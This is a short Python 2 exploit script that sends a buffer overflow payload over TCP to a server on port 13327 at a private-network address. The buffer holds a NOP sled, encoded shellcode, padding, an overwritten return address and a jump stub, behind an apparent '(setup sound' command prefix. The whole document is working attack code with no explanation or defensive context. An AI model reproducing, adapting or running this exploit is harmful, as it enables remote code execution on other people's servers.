#!/usr/bin/python
import socket

host = "192.168.0.105"

nops = "\x90" * 8

shellcode = ""
shellcode += "\xba\xd8\xcd\xb9\x60\xdd\xc2\xd9\x74\x24\xf4"
shellcode += "\x58\x33\xc9\xb1\x12\x31\x50\x12\x83\xc0\x04"
shellcode += "\x03\x88\xc3\x5b\x95\x19\x07\x6c\xb5\x0a\xf4"
shellcode += "\xc0\x50\xae\x73\x07\x14\xc8\x4e\x48\xc6\x4d"
shellcode += "\xe1\x76\x24\xed\x48\xf0\x4f\x85\x8a\xaa\xb0"
shellcode += "\xff\x63\xa9\xb0\xee\x2f\x24\x51\xa0\xb6\x66"
shellcode += "\xc3\x93\x85\x84\x6a\xf2\x27\x0a\x3e\x9c\xd9"
shellcode += "\x24\xcc\x34\x4e\x14\x1d\xa6\xe7\xe3\x82\x74"
shellcode += "\xab\x7a\xa5\xc8\x40\xb0\xa6"

a_symbols = "\x41" * (4368 - len(nops) - len(shellcode))
eip = "\x96\x45\x13\x08"
shell1 = "\x83\xc0\x0c\xff\xe0\x90\x90"
buffer = "\x11(setup sound " + nops + shellcode + a_symbols + eip + shell1 + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent!"